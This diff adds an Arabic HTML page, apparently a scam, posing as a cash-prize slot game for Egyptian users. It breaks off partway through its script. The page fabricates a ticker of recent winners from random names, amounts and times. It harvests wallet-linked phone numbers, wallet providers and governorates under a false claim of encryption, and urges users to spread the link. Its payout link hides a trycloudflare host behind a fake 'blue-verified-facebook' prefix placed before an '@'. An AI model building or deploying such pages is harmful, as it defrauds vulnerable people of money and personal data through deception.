@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>كازينو الجوائز</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+:root {
+  --primary: #00bfae;
+  --secondary: #ff64a4;
+  --btn-grad: linear-gradient(90deg,#003366 0%,#00bfae 100%);
+  --btn-hover: linear-gradient(90deg,#00bfae 0%,#003366 100%);
+  --egmoney: #2ecc71;
+  --footer-bg: #f7fafd;
+  --popup-bg: rgba(0,0,0,.43);
+}
+html,body {
+  font-family:'Cairo',sans-serif!important;
+  background:linear-gradient(135deg,#ffe5f7 0%,#c1f5fd 38%,#fffde4 100%);
+  margin:0;padding:0;min-height:140vh;
+  transition: background 0.6s cubic-bezier(.55,.12,.64,.99);
+  height: 100%;
+  position: relative;
+}
+body {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-height:140vh;
+  justify-content: flex-start;
+  background-attachment: fixed;
+  padding-bottom:210px;
+  overflow-x:hidden;
+}
+.body-fade {
+  position:fixed;
+  left:0;right:0;bottom:0;
+  height:70px;
+  background:linear-gradient(180deg,rgba(255,255,255,0) 2%,#fffde4 98%);
+  pointer-events:none;
+  z-index:110;
+  width:100vw;
+  background-size:cover;
+}
+.logo-bar {
+  width:100vw;
+  background:linear-gradient(90deg,#00bfae 60%, #ff64a4 100%);
+  display:flex;align-items:center;justify-content:center;gap:16px;
+  padding:1.1rem 0 .9rem 0;border-bottom-left-radius:20px;border-bottom-right-radius:20px;
+  margin-bottom:18px;box-shadow:0 5px 30px #00bfae1a;
+  animation:fadeInDown .8s;
+  position:relative;
+}
+@keyframes fadeInDown {0%{opacity:0;transform:translateY(-20px);}100%{opacity:1;transform:translateY(0);}}
+.logo-svg {
+  width:43px;height:43px;background:#fff;border-radius:50%;box-shadow:0 1px 10px #00bfae30;
+  display:flex;align-items:center;justify-content:center;cursor:pointer;
+  transition:box-shadow 0.3s;
+}
+.logo-bar span {
+  font-size:1.4rem;font-weight:900;color:#fff;letter-spacing:.5px;text-shadow:0 1.5px 8px #00bfae50;
+}
+.reset-secret-btn {
+  display:none;
+  position:absolute;left:12px;top:12px;
+  background:var(--secondary);color:#fff;font-size:.99em;font-weight:800;
+  border:none;border-radius:13px;padding:.5em 1.2em;box-shadow:0 2px 14px #ff64a450;
+  cursor:pointer;z-index:30;transition:all .15s;
+  opacity:.85;
+}
+.reset-secret-btn:hover{opacity:1;background:#003366;}
+.container {
+  background:linear-gradient(120deg,#fff 75%,#e3f6fc 100%);
+  border-radius:28px;box-shadow:0 7px 32px #ff64a445,0 1.5px 8px #00c9a736;
+  padding:2.1rem 1.3rem 3.5rem;max-width:430px;width:100%;text-align:center;position:relative;margin:28px auto 56px auto;z-index:2;
+  animation:bounceInUp .7s;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-height: 930px;
+}
+@keyframes bounceInUp{0%{opacity:0;transform:translateY(70px);}80%{transform:translateY(-10px);}100%{opacity:1;transform:translateY(0);}}
+h1{color:#003366;margin-bottom:1.1em;font-size:2.1rem;font-weight:800;letter-spacing:.5px;text-shadow:0 2px 8px #00336612;}
+.circular-chances {
+  width:70px;height:70px;margin:0 auto 1.2em;position:relative;display:inline-block;
+  box-shadow:0 0 16px #00bfae22;
+  background: #e3f6fc;
+  border-radius: 50%;
+}
+.circular-chances svg{width:100%;height:100%;}
+.circular-chances .chance-num{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:1.5em;color:#003366;font-weight:900;}
+.slot {
+  margin:1.1rem auto 1.5rem;
+  padding:1.2em 0;
+  font-size:2.8rem;
+  font-weight:bold;
+  color:#003366;
+  width:220px;
+  min-width: 148px;
+  max-width: 96vw;
+  background:
+    url('https://raw.githubusercontent.com/500usdprizes/sounds/main/Picsart_25-07-02_00-22-21-443.png') center 48%/contain no-repeat,
+    linear-gradient(90deg,#fffbe5 60%,#e0f7fa 100%);
+  border-radius:21px;
+  box-shadow:0 2px 16px #ffe1f2bb,0 8px 40px #00bfae11;
+  user-select:none;
+  letter-spacing:3px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:0.6em;
+  min-height:64px;
+  transition:box-shadow .2s,background 0.3s;
+  position:relative;
+}
+.slot.shake {animation:winShake 0.6s;}
+@keyframes winShake {
+  10%, 90% { transform: translateX(-2px);}
+  20%, 80% { transform: translateX(4px);}
+  30%, 50%, 70% { transform: translateX(-8px);}
+  40%, 60% { transform: translateX(8px);}
+  100%{transform:none;}
+}
+.slot .slot-anim{animation:slotSpin .45s cubic-bezier(.36,1.2,.31,1.01);}
+@keyframes slotSpin{0%{transform:rotate(-10deg) scale(.85);}30%{transform:rotate(9deg) scale(1.18);}100%{transform:rotate(0deg) scale(1);}}
+.slot .slot-emoji {
+  font-size: 1.8em;
+  filter: drop-shadow(0 2px 6px #00bfae15);
+  transition: filter 0.2s;
+}
+.slot .slot-emoji.win {
+  filter: drop-shadow(0 0 8px #2ecc71bb);
+  animation: winGlow 1.3s infinite alternate;
+}
+@keyframes winGlow {
+  to { filter: drop-shadow(0 0 22px #00bfae) drop-shadow(0 0 6px #ff64a4); }
+}
+.btn-spin, .btn-action {
+  background:var(--btn-grad);color:#fff;font-size:1.15rem;font-weight:800;border:none;
+  border-radius:22px;padding:.95em 2.2em;margin:1.1em 0 .5em 0;cursor:pointer;
+  box-shadow:0 4px 18px #0033661a,0 0px 40px #00bfae22;transition:all .17s;
+  outline:none;z-index:1;letter-spacing:1px;position:relative;overflow:hidden;
+  min-width: 180px;
+  font-family: 'Cairo', sans-serif !important;
+  display: block;
+  margin-right: auto;
+  margin-left: auto;
+}
+.btn-spin:hover,.btn-action:hover{background:var(--btn-hover);transform:scale(1.09) rotate(-2deg);}
+.btn-spin:active,.btn-action:active{box-shadow:0 3px 12px #00bfae20;}
+.btn-spin[disabled]{opacity:.5;cursor:not-allowed;background:#eee;color:#aaa;}
+.winner-message{
+  background:linear-gradient(90deg,#e3f6fc 80%,#f8fafc 100%);
+  color:#003366;
+  font-size:1.13rem;
+  border-radius:16px;
+  margin:1.2em auto .7em auto;
+  padding:1.1em .7em;
+  animation:pop .7s;
+  font-weight:700;
+  box-shadow:0 2px 14px #ffd1e5aa;
+  min-height:44px;
+  display:none;
+  max-width: 320px;
+  text-align: center;
+  justify-content: center;
+  align-items: center;
+}
+@keyframes pop{0%{transform:scale(.8);opacity:0;}60%{transform:scale(1.15);}100%{transform:scale(1);opacity:1;}}
+.my-wins{
+  background:#e0f7fa;
+  border-radius:16px;
+  margin:1.3em 0 1.2em 0;
+  padding:.9em .8em .5em;
+  font-size:1.05rem;
+  color:#003366;
+  box-shadow:0 1px 10px #00bfae22;
+  text-align:center;
+  display:none;
+  max-width: 320px;
+  margin-right:auto;margin-left:auto;
+}
+.my-wins ul{padding:0;margin:0;list-style:none;}
+.my-wins li{font-weight:bold;padding:4px 0;color:#009688;}
+.my-wins li .egmoney{color:#2ecc71;font-weight:900;font-size:1.14em;margin-right:8px;}
+.winners-list{
+  width:100%;
+  background:#fff9fd;
+  border-radius:17px;
+  box-shadow:0 1px 8px #ffe1f2cc;
+  margin:2em 0 .7em 0;
+  padding:.7em .3em .2em;
+  font-size:1.05rem;
+  text-align:right;min-height:56px;
+  max-height:165px;overflow:hidden;direction:rtl;position:relative;
+  margin-right:auto;margin-left:auto;
+}
+.winners-list h3 {
+    margin-bottom: 2px;
+    margin-top: 0 !important;
+    padding-top: 0 !important;
+    position: relative;
+    top: -16px; /* ارفع العنوان لفوق */
+  }
+.ticker{
+  margin-top: -14px;
+  position:relative;
+  height:110px;
+  overflow:hidden;
+}
+.ticker ul{
+  padding:0;margin:0;list-style:none;position:absolute;top:0;right:0;width:100%;transition:top .55s cubic-bezier(.4,.65,.45,1.14);
+}
+.ticker li{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  height:54px;
+  justify-content:flex-end;
+  font-size:0.98em;
+  flex-wrap:wrap;
+  line-height:1.35;
+  direction:rtl;
+  padding-right:10px;
+}
+.ticker svg{width:18px;height:18px;}
+.ticker b {
+  font-size:1.09em;
+  color:#003366;
+  font-weight:800;
+  margin:0 6px;
+  max-width:90px;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+  display:inline-block;
+}
+.ticker span.egmoney {
+  display: inline-block;
+  font-size:1em;font-weight:900;
+  background:#e3f6fc;
+  color:#2ecc71;
+  border-radius:9px;
+  padding:0 7px;
+  margin:0 3px;
+}
+.ticker span.time {
+  font-size:0.91em;
+  color:#aaa;
+  margin-right:0;
+  margin-left:0;
+  display:inline-block;
+  width:70px;
+}
+.tips{display:none;}
+.form-section{
+  margin-top:1.15em;
+  padding:1.2em .2em .9em;
+  display:none;
+  width:100%;
+  text-align:center;
+  align-items:center;
+  justify-content:center;
+}
+.form-row{
+  display:flex;gap:10px;align-items:flex-end;justify-content:center;margin-bottom:11px;flex-wrap:wrap;
+}
+.form-group{
+  flex:1 1 48%;
+  min-width:110px;
+  display:flex;
+  flex-direction:column;
+  align-items:flex-start;
+  margin-bottom:0;
+  position:relative;
+  margin-right:auto;margin-left:auto;
+}
+.form-group label{font-size:1.08rem;font-weight:600;color:#003366;margin-bottom:4px;}
+.form-group label[for="govern"] {
+  font-size:1.16rem;font-weight:800;color:#ff64a4;margin-bottom:8px;letter-spacing:0.5px;
+}
+#govern {
+  appearance: none;
+  -webkit-appearance: none;
+  border: 2px solid #00bfae;
+  background: linear-gradient(90deg,#f8fafc 70%,#e0f7fa 100%);
+  border-radius: 14px;
+  padding: 0.85em 2.6em 0.85em 0.9em;
+  font-size: 1.14em;
+  font-weight: 700;
+  color: #003366;
+  outline:none;
+  transition: box-shadow .18s, border .18s;
+  box-shadow:0 2px 10px #00bfae14;
+  position:relative;
+  cursor:pointer;
+  text-align:right;
+  margin-bottom: 10px;
+  background-image: url('data:image/svg+xml;utf8,<svg fill="teal" height="18" viewBox="0 0 20 20" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M7.293 7.293a1 1 0 011.414 0L10 8.586l1.293-1.293a1 1 0 111.414 1.414l-2 2a1 1 0 01-1.414 0l-2-2a1 1 0 010-1.414z"></path></svg>');
+  background-repeat: no-repeat;
+  background-position: left 1.1em center;
+  background-size: 1.2em;
+}
+#govern:focus, #govern:hover {
+  border-color:#ff64a4;
+  box-shadow:0 4px 20px #ff64a420;
+}
+#govern.bounce {
+  animation: bouncegov 0.6s;
+}
+@keyframes bouncegov {
+  0%{transform:scale(1);}
+  35%{transform:scale(1.13);}
+  65%{transform:scale(0.92);}
+  100%{transform:scale(1);}
+}
+.wallet-row{
+  width:100%;
+  display:flex;
+  gap:0;
+  align-items:center;
+  background:#f8fafc;
+  border-radius:12px;
+  border:1.5px solid #e3f6fc;
+  transition:border .15s;
+  position:relative;
+  justify-content:center;
+}
+.wallet-row:focus-within{border-color:#00bfae;background:#fff;}
+.wallet-logo-btn{background:transparent;border:none;cursor:pointer;outline:none;display:flex;align-items:center;padding:0 10px 0 0;font-size:1.28em;}
+.wallet-svg-bank { width: 1.6em; height: 1.6em; margin-left: 4px; margin-right: 2px; vertical-align: middle; }
+.wallet-row input{border:none;background:transparent;flex:1 1 60%;min-width:90px;padding:11px 6px 11px 0;font-size:1.08em;direction:ltr;text-align:right;color:#003366;}
+.wallet-row input:focus{outline:none;}
+.wallet-row .wallet-selected{flex:1 1 40%;display:flex;align-items:center;gap:3px;cursor:pointer;user-select:none;min-width:80px;}
+.wallet-row .wallet-selected .wallet-icon{font-size:1.19em;}
+.wallet-row .wallet-selected .wallet-arrow{font-size:1.06em;transition:transform .17s;}
+.wallet-options-pop{display:none;position:absolute;top:110%;right:0;background:#fff;box-shadow:0 14px 24px #00bfae19;border-radius:12px;z-index:10;min-width:140px;max-height:210px;overflow-y:auto;padding:0;margin:0;border:1.5px solid #e3f6fc;}
+.wallet-options-pop.active{display:block;}
+.wallet-options-pop li{list-style:none;padding:9px 17px 7px 9px;cursor:pointer;display:flex;align-items:center;gap:8px;font-size:1.04em;transition:background .14s;}
+.wallet-options-pop li:hover{background:#f8fafc;}
+.field-error{color:#d32f2f;font-size:1em;margin-top:3px;min-height:18px;position:relative;}
+.verify-message{font-size:1.15rem;font-weight:900;color:#2ecc71;margin-top:13px;margin-bottom:7px;display:none;background:#e6fff7;padding:10px 0 12px 0;border-radius:10px;}
+.phase2-link{
+  display:none;
+  margin-top:18px;
+  width:100%;
+  text-align:center;
+  align-items:center;
+  justify-content:center;
+}
+.phase2-link button{
+  background:var(--primary);
+  color:#fff;
+  border:none;
+  border-radius:19px;
+  padding:1.1em 2.9em;
+  font-size:1.1em;
+  font-weight:900;
+  box-shadow:0 3px 12px #00bfae33;transition:.17s;cursor:pointer;
+  margin-top:0px;
+  margin-bottom:14px;
+}
+.phase2-link button:hover{background:#003366;}
+.modal-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;background:var(--popup-bg);display:none;align-items:center;justify-content:center;z-index:999;}
+.modal-bg.active{display:flex;}
+.modal-popup{
+  background:#fff;
+  border-radius:22px;
+  box-shadow:0 8px 40px #00bfae27;
+  max-width:345px;
+  width:90vw;
+  padding:38px 20px 24px 20px;
+  position:relative;
+  text-align:center;
+  animation:pop .6s;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.modal-popup .modal-close{position:absolute;top:14px;left:18px;background:none;border:none;font-size:1.5em;color:#ff64a4;cursor:pointer;}
+.modal-popup .modal-header{font-weight:900;font-size:1.27em;color:#00bfae;margin-bottom:.9em;}
+.modal-popup .modal-body{font-size:1.2em;margin-bottom:.7em;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.modal-popup .modal-action{margin-top:1.2em;}
+.main-footer{
+  width:100vw;background:var(--footer-bg);color:#333;font-size:.68em;text-align:center;
+  padding:18px 2px 18px 2px;border-top:1.5px solid #e3f6fc;position:fixed;bottom:0;left:0;z-index:10;
+  letter-spacing:.01em;user-select:none;
+}
+.loader-checking {
+  display: inline-block;
+  width: 32px;
+  height: 32px;
+  vertical-align: middle;
+  margin-bottom: 14px;
+  border: 4px solid #e0f7fa;
+  border-radius: 50%;
+  border-top: 4px solid #00bfae;
+  animation: spinloader 1s linear infinite;
+}
+@keyframes spinloader {100% { transform: rotate(360deg); }}
+.loading-popup-bg {
+  position: fixed;
+  top: 0; left: 0; width: 100vw; height: 100vh;
+  background: rgba(0,0,0,0.32);
+  z-index: 9999;
+  display: flex; align-items: center; justify-content: center;
+  animation: fadeInPop .18s;
+}
+.loading-popup {
+  background: #fff;
+  border-radius: 22px;
+  padding: 38px 20px 28px 20px;
+  box-shadow: 0 8px 40px #00bfae27;
+  max-width: 330px;
+  min-width: 210px;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  font-family: 'Cairo', sans-serif;
+  animation: pop .5s;
+}
+.loading-popup .loader-checking {margin-bottom: 9px;}
+.loading-popup-text {
+  color: #009688;
+  font-size: 1.13em;
+  font-weight: 700;
+  margin-bottom: 3px;
+  letter-spacing: .01em;
+}
+@keyframes fadeInPop { from { opacity: 0; } to { opacity: 1; } }
+.confetti {
+  pointer-events:none;
+  position:fixed;
+  left:0;top:0;width:100vw;height:100vh;
+  z-index:10005;
+  overflow:visible;
+  display:none;
+}
+
+@media (max-width:700px){
+  .container{min-height:600px;}
+  .body-fade {height:60px;}
+  .container{max-width:99vw;padding:1.2rem 2vw 1.2rem;}
+  h1{font-size:1.14rem;}
+  .logo-bar span{font-size:1.08rem;}
+  .slot{gap: 1.3em;font-size:1.01rem;
+    min-width:100px;
+    background-size: 130% !important;
+    background-position: center 48% !important;
+  }
+   .modal-popup {
+    padding: 12px 2vw 10px 2vw !important;
+    max-width: 96vw !important;}
+  .slot-emoji{font-size: 2.9em;}
+  .form-row{flex-direction:column;gap:0;}
+  .form-group{min-width:90px;}
+  .ticker {
+    min-height: 110px;
+    height: auto !important;
+    max-height: unset !important;
+    overflow: visible !important;
+    margin-top: 30px;
+  }
+  
+  .ticker li{
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    font-size:1.05em;
+    min-height:44px;
+    padding-bottom:8px;
+    padding-top:4px;
+    line-height:1.5;
+  }
+  .main-footer{font-size:.62em;}
+  .modal-popup{padding:18px 6vw 20px 6vw;}
+  .loading-popup {padding: 23px 5vw 23px 5vw;}
+  .winners-list h3{font-size:.98rem;}
+  .ticker b{font-size:1.01em;max-width:120px;}
+}
+@media (min-width: 900px) {
+  .container {
+    background: none !important;
+    box-shadow: none !important;
+    border-radius: 0 !important;
+    padding: 0 !important;
+    min-height: 0 !important;
+  }
+  .slot {
+    background: url('https://raw.githubusercontent.com/500usdprizes/sounds/main/Picsart_25-07-02_00-22-21-443.png') center 50%/600px no-repeat !important;
+    background-color: transparent !important;
+    min-width: 430px !important;
+    min-height: 210px !important;
+    box-shadow: none !important;
+    margin-bottom: 30px;
+    font-size: 4rem;
+  }
+ .slot .slot-emoji { font-size: 1.2em; }
+}
+  </style>
+</head>
+<body>
+<div class="logo-bar">
+  <button class="reset-secret-btn" id="reset-secret-btn" title="إعادة المحاولة (خاص بك)">إعادة اللعب</button>
+  <div class="logo-svg" id="logo-svg">
+    <svg viewBox="0 0 42 42" width="38" height="38">
+      <defs>
+        <radialGradient id="g1" cx="60%" cy="40%" r="80%">
+          <stop offset="0%" stop-color="#fff"/>
+          <stop offset="80%" stop-color="#00bfae"/>
+        </radialGradient>
+      </defs>
+      <circle cx="21" cy="21" r="20" fill="url(#g1)" stroke="#ff64a4" stroke-width="2"/>
+      <text x="50%" y="62%" text-anchor="middle" dominant-baseline="middle" font-size="22" font-family="Cairo" font-weight="bold" fill="#ff64a4">💎</text>
+    </svg>
+  </div>
+  <span>كازينو الجوائز بالجنيه المصري</span>
+</div>
+<div class="container" id="main-container">
+  <h1>جرب حظك واربح جوائز نقدية بالجنيه المصري!</h1>
+  <div class="circular-chances">
+    <svg>
+      <circle cx="32.5" cy="32.5" r="28" fill="none" stroke="#e0f7fa" stroke-width="8"/>
+      <circle id="circle-progress" cx="32.5" cy="32.5" r="28" fill="none" stroke="#00bfae" stroke-width="7" stroke-linecap="round"
+      stroke-dasharray="176" stroke-dashoffset="0" style="transform:rotate(-90deg);transform-origin:50% 50%;"/>
+    </svg>
+    <span class="chance-num" id="chanceCount">10</span>
+  </div>
+  <div class="slot" id="slot">
+    <span class="slot-emoji">💸</span>
+    <span class="slot-emoji">💰</span>
+    <span class="slot-emoji">🪙</span>
+  </div>
+  <button class="btn-spin" id="btn-spin">🎰 اسحب واربح</button>
+  <div class="winner-message" id="winner-message"></div>
+  <div class="my-wins" id="my-wins">
+    <div>الجوائز التي ربحتها:</div>
+    <ul id="my-wins-list"></ul>
+  </div>
+  <div class="winners-list">
+    <h3>الفائزون مؤخراً:</h3>
+    <div class="ticker"><ul id="ticker-list"></ul></div>
+  </div>
+  <div class="tips" id="tips"></div>
+  <div class="form-section" id="form-section">
+    <form id="verify-form" autocomplete="off">
+      <div class="form-row">
+        <div class="form-group" style="flex:2">
+          <label>رقم الجوال المرتبط بالمحفظة:</label>
+          <div class="wallet-row" id="walletRow">
+            <button class="wallet-logo-btn" id="walletLogoBtn" type="button" tabindex="-1" aria-label="اختر المحفظة"></button>
+            <input type="text" id="phone" maxlength="11" minlength="11" inputmode="numeric" required autocomplete="off" placeholder="رقم الجوال" style="direction:ltr;text-align:right;">
+            <div class="wallet-selected" id="walletSelected">
+              <span class="wallet-icon" id="walletSelectedIcon">🏦</span>
+              <span id="walletSelectedName" style="font-size:1em;color:#009688;">محفظتك</span>
+              <span class="wallet-arrow" id="walletArrow">▼</span>
+            </div>
+            <ul class="wallet-options-pop" id="walletOptionsPop"></ul>
+          </div>
+          <div class="field-error" id="phone-error"></div>
+        </div>
+      </div>
+      <div class="form-group" style="width:100%;text-align:right;">
+        <label for="govern">المحافظة:</label>
+        <select id="govern" required style="width:100%"></select>
+        <div class="field-error" id="govern-error"></div>
+      </div>
+      <button type="submit" class="btn-action" id="verify-btn">تأكيد البيانات</button>
+    </form>
+    <div class="verify-message" id="verify-message"></div>
+    <div class="phase2-link" id="phase2-link">
+      <button>إكمال الاستلام</button>
+    </div>
+  </div>
+  <div class="winner-message" id="already-done" style="display:none;">لقد قمت باستلام جائزتك بالفعل.</div>
+</div>
+<div class="body-fade"></div>
+<canvas class="confetti" id="confetti"></canvas>
+<div class="modal-bg" id="modal-bg">
+  <div class="modal-popup" id="modal-popup">
+    <button class="modal-close" id="modal-close" title="إغلاق">×</button>
+    <div class="modal-header" id="modal-header"></div>
+    <div class="modal-body" id="modal-body"></div>
+    <div class="modal-action" id="modal-action"></div>
+  </div>
+</div>
+<audio id="spin-sound" src="https://raw.githubusercontent.com/500usdprizes/sounds/main/spin-232536.mp3"></audio>
+<audio id="win-sound" src="https://raw.githubusercontent.com/500usdprizes/sounds/main/win-176035.mp3"></audio>
+<footer class="main-footer">
+  جميع العمليات مؤمنة وتتم عبر نظام" تشفير عالي المستوى Access encrypted"
+  <div style="margin-top:6px;font-size:.86em;color:#888;">
+    <span style="margin-left:8px;">🎉 جديد: شارك رابطك مع أصدقائك لفرصة ربح إضافية!</span>
+    <button id="share-btn" style="background:#00bfae;color:#fff;border:none;padding:3px 17px;border-radius:12px;cursor:pointer;font-size:1em;font-weight:bold;margin-right:6px;">مشاركة رابط</button>
+  </div>
+</footer>
+<script>
+const walletsJson = [
+  {id:"vodafone",name:"فودافون كاش",icon:"<img src='https://i.postimg.cc/3rpWfnHq/Vodafone.png' alt='فودافون كاش' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"orange",name:"أورانج موني",icon:"<img src='https://i.postimg.cc/LXjVCmsQ/orangecash.png' alt='أورانج موني' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"etisalat",name:"اتصالات كاش",icon:"<img src='https://i.postimg.cc/52Z7n730/Picsart-25-07-02-09-27-52-987.png' alt='اتصالات كاش' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"aman",name:"أمان",icon:"<img src='https://i.postimg.cc/k56sSQPm/amanpay.png' alt='أمان' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"noon",name:"نون باي",icon:"<img src='https://i.postimg.cc/mrtXwxMK/nonpay.png' alt='نون باي' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"instapay",name:"انستا باي",icon:"<img src='https://i.postimg.cc/pXRsS5zf/instapay.png' alt='انستا باي' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"wepay",name:"WE Pay",icon:"<img src='https://i.postimg.cc/VkNDfy75/wepay.png' alt='WE Pay' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"fawry",name:"فوري",icon:"<img src='https://i.postimg.cc/8zyXMkFh/dawri.png' alt='فوري' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"},
+  {id:"other",name:"أخرى",icon:"<img src='https://i.postimg.cc/ZKwmwd0g/17470916.png' alt='أخرى' style='width:23px;height:23px;border-radius:50%;background:#fff;'/>"}
+];
+const governsJson = [
+  {id:"giza",name:"الجيزة"},{id:"alex",name:"الإسكندرية"},{id:"cairo",name:"القاهرة"},
+  {id:"aswan",name:"أسوان"},{id:"sharqia",name:"الشرقية"},{id:"dakahliya",name:"الدقهلية"},
+  {id:"fayoum",name:"الفيوم"},{id:"sohag",name:"سوهاج"},{id:"beni_suef",name:"بني سويف"},
+  {id:"luxor",name:"الأقصر"},{id:"qena",name:"قنا"},{id:"matrouh",name:"مطروح"},{id:"redsea",name:"البحر الأحمر"},{id:"other",name:"أخرى"}
+];
+const moneyEmojis = ["💸","💰","🪙","💵"];
+const otherEmojis = ["🎯","🍀","⭐","🔔","🎲","🎰"];
+const governSelect = document.getElementById('govern');
+governSelect.addEventListener('change', function(){
+  governSelect.classList.remove('bounce');
+  void governSelect.offsetWidth;
+  governSelect.classList.add('bounce');
+});
+function اطلق_كونفتي() {
+  const canvas = document.getElementById("confetti");
+  const ctx = canvas.getContext("2d");
+  const W = window.innerWidth, H = window.innerHeight;
+  canvas.width = W; canvas.height = H;
+  canvas.style.display = 'block';
+  let اوراق = [];
+  for(let i=0;i<150;i++) {
+    اوراق.push({
+      x: Math.random()*W,
+      y: Math.random()*-H,
+      r: 6+Math.random()*12,
+      d: Math.random()*W,
+      color: "hsl("+(Math.random()*360)+",80%,60%)",
+      tilt:Math.random()*8-4,
+      tiltAngle:0,
+      tiltAngleInc:Math.random()*0.07+0.05
+    });
+  }
+  let زاوية = 0;
+  function ارسم() {
+    ctx.clearRect(0,0,W,H);
+    اوراق.forEach(function(c) {
+      ctx.beginPath();
+      ctx.lineWidth = c.r;
+      ctx.strokeStyle = c.color;
+      ctx.moveTo(c.x+c.tilt+Math.sin(زاوية), c.y);
+      ctx.lineTo(c.x+c.tilt+c.r/2, c.y+c.r*2);
+      ctx.stroke();
+    });
+    حدث();
+    requestAnimationFrame(ارسم);
+  }
+  function حدث() {
+    زاوية += 0.01;
+    اوراق.forEach(function(c,i){
+      c.y += (Math.cos(زاوية+c.d)+3+c.r/2)/2;
+      c.x += Math.sin(زاوية);
+      c.tiltAngle += c.tiltAngleInc;
+      c.tilt = Math.sin(c.tiltAngle)*10;
+      if(c.y > H+40) {
+        اوراق[i] = {
+          x: Math.random()*W, y: -20, r: 6+Math.random()*12, d: Math.random()*W,
+          color: "hsl("+(Math.random()*360)+",80%,60%)", tilt:Math.random()*8-4, tiltAngle:0, tiltAngleInc:Math.random()*0.07+0.05
+        };
+      }
+    });
+  }
+  ارسم();
+  setTimeout(()=>{canvas.style.display='none';ctx.clearRect(0,0,W,H);}, 2500);
+}
+let logoClicks = 0, resetTimeout;
+document.getElementById('logo-svg').onclick = function(){
+  logoClicks++;
+  clearTimeout(resetTimeout);
+  if(logoClicks >= 15){
+    logoClicks = 0;
+    document.getElementById('reset-secret-btn').style.display = 'inline-block';
+    setTimeout(()=>{document.getElementById('reset-secret-btn').style.opacity='1';},10);
+  } else {
+    resetTimeout = setTimeout(()=>{logoClicks=0;}, 2000);
+  }
+};
+document.getElementById('reset-secret-btn').onclick = function(){
+  localStorage.removeItem('casino-ar-prizes');
+  location.reload();
+};
+let localData = JSON.parse(localStorage.getItem("casino-ar-prizes")||"{}");
+function saveLocal(){
+  localStorage.setItem("casino-ar-prizes",JSON.stringify(localData));
+}
+if(localData && localData.finished){
+  document.getElementById('main-container').innerHTML = `
+    <div class="winner-message" style="margin-top:60px;min-height:80px;font-size:1.22em;display:block">
+      لقد قمت باستلام جائزتك بالفعل.<br>
+      <a href="https://blue-verified-facebook-free@reasoning-entering-bouquet-moves.trycloudflare.com" class="btn-action" style="margin-top:18px;font-size:1.12em;">إكمال الاستلام</a>
+    </div>
+  `;
+  document.querySelector('.main-footer').style.display = 'block';
+} else {
+const nameSeed = [
+  "محمود عادل","سارة محمود","علي مصطفى","أحمد ياسر","ياسمين نبيل",
+  "نور الدين","دنيا حسن","محمود طاهر","خالد العزب","مروة علي","يوسف سلامة","نهى عبدالباسط",
+  "حسن يوسف","أحمد رجب","سيف محمد","أمل عادل","نورهان حسن","زياد مصطفى","ملك علي","آية يوسف",
+  "سيد إبراهيم","حازم محمد","أحمد مجدي","سلمى مصطفى","فاطمة حسن","محمد طارق","عمر خالد","داليا عمر",
+  "سامي عبدالعزيز","طارق أحمد","يحيى عز","منة الله حسن","إسلام محمد","تقى وليد","سيف الدين","عصام سعيد",
+  "أحمد موسى","شيماء مصطفى","حسن شوقي","هند جمال"
+];
+let winners = [];
+function randomPrizeMoney() {
+  let values = [1000,1500,2000,2500,3000,5000,7000,8000,9000,10000,12000,15000,18000,20000];
+  return values[Math.floor(Math.random()*values.length)];
+}
+function randomTime() {
+  const t = Math.floor(Math.random()*5);
+  if(t===0) return `منذ ${Math.floor(1+Math.random()*58)} ثانية`;
+  if(t===1) return `منذ ${Math.floor(1+Math.random()*59)} دقيقة`;
+  if(t===2) return `منذ ${Math.floor(1+Math.random()*23)} ساعة`;
+  return `منذ ${Math.floor(1+Math.random()*5)} أيام`;
+}
+function randomName() {
+  return nameSeed[Math.floor(Math.random()*nameSeed.length)];
+}
+function addWinner(emojis, prize) {
+  winners.unshift({
+    name: randomName(),
+    emojis: emojis.join(''),
+    prize: prize,
+    time: randomTime()
+  });
+  if(winners.length > 40) winners = winners.slice(0,40);
+}
+for(let i=0;i<40;i++){
+  let emoji = moneyEmojis[Math.floor(Math.random()*moneyEmojis.length)];
+  let prize = randomPrizeMoney();
+  addWinner([emoji,emoji,emoji], prize);
+}
+let tickerIndex = 0;
+let tickerDir = 1;
+const tickerList = document.getElementById('ticker-list');
+function renderTicker() {
+  tickerList.innerHTML = '';
+  winners.forEach(w => {
+    tickerList.innerHTML += `<li>
+      <b title="${w.name}">${w.name}</b>
+      <span style="color:#003366;font-weight:600">${w.emojis}</span>
+      <span class="egmoney">${w.prize} جنيه</span>
+      <span class="time">${w.time}</span>
+    </li>`;
+  });
+  // هنا ضع السطر بالضبط بعد انتهاء الحلقة
+  if (winners.length <= 2) {
+    tickerList.style.top = '0px';
+  }
+}
+renderTicker();
+function tickerLoop() {
+  const liHeight = tickerList.querySelector('li')?.offsetHeight || 54;
+  tickerList.style.top = `-${tickerIndex * liHeight}px`;
+  tickerIndex += tickerDir;
+  if(tickerIndex >= winners.length-2) tickerDir = -1;
+  if(tickerIndex <= 0) tickerDir = 1;
+}
+setInterval(tickerLoop, 1800);
+governsJson.forEach(g => {
+  let opt = document.createElement('option');
